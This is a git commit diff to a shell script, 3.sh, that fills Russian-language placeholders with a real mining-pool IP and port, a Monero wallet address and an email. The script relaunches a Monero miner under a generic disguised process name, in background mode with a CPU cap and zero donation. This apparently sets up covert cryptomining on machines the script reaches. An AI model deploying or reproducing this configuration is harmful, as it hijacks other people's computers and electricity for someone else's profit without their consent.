0dbe936dc4a47ab70cfb26172ad479279310dc96
uvajenie <58940226+uvajenie@users.noreply.github.com>
2020-04-01 06:49:28 -0700

    Update 3.sh

--- 3.sh
+++ 3.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=83 --av=1
+defaultsoftwarename -o 51.75.104.169:3321 -u 457jd2jEELQgMZyGKWXB7K4sBzRb4SC2z6NecNk5rfiTcBzGPX3EvR7JEu356EAqoKPyAXDdC8VQoYURN5C8aR5cDJfx672 --pass=x:uvajenie@protonmail.com --rig-id=4 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=83 --av=1
